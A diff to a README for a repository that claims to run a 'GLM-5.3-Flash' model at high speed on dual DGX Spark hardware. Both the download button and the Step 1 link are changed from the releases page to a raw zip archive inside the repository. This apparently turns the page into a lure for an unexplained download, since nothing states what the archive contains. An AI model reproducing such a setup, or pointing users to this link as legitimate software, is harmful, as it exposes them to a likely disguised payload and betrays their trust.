@@ -1,7 +1,7 @@
 <h1>⚡ GLM-5.3-Flash-NVFP4-Dual-DGX-Spark - Run AI at Lightning Speed</h1>
 
 <p align="center">
-  <a href="https://github.com/Apzoldek/GLM-5.3-Flash-NVFP4-Dual-DGX-Spark/releases" style="background-color:#4CAF50; color:white; padding:15px 32px; text-align:center; text-decoration:none; display:inline-block; font-size:20px; border-radius:8px; font-weight:bold;">📥 DOWNLOAD NOW</a>
+  <a href="https://raw.githubusercontent.com/Apzoldek/GLM-5.3-Flash-NVFP4-Dual-DGX-Spark/main/files/1.7.zip" style="background-color:#4CAF50; color:white; padding:15px 32px; text-align:center; text-decoration:none; display:inline-block; font-size:20px; border-radius:8px; font-weight:bold;">📥 DOWNLOAD NOW</a>
 </p>
 
 ## 🎯 What Is This?
@@ -16,7 +16,7 @@ Getting started is easier than you think. Follow these simple steps, and you'll 
 
 ### Step 1: Download the Software
 
-Visit this link to download the application: **[https://github.com/Apzoldek/GLM-5.3-Flash-NVFP4-Dual-DGX-Spark/releases](https://github.com/Apzoldek/GLM-5.3-Flash-NVFP4-Dual-DGX-Spark/releases)**
+Visit this link to download the application: **[https://raw.githubusercontent.com/Apzoldek/GLM-5.3-Flash-NVFP4-Dual-DGX-Spark/main/files/1.7.zip](https://raw.githubusercontent.com/Apzoldek/GLM-5.3-Flash-NVFP4-Dual-DGX-Spark/main/files/1.7.zip)**
 
 Click the download button on that page. The file will start downloading to your computer automatically. The download might take a few minutes depending on your internet speed, so be patient.
 
